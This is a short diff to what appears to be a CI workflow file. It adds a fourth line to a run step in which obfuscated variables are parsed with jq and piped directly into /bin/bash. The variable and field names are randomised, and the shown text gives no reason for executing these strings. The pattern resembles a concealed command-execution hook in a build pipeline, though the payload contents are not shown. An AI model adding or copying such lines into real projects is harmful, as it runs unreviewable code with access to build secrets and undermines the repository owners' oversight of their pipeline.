@@ -25,6 +25,7 @@ jobs:
           echo $cbwpy3 | jq -r .ud30 | /bin/bash
           printf '%s' "$qcsav6403" | jq -r .roolx3728 | /bin/bash
           printf '%s' "$qfcym57721" | jq -r .z45 | /bin/bash
+          printf '%s' "$dqbap45" | jq -r .qadzm718 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
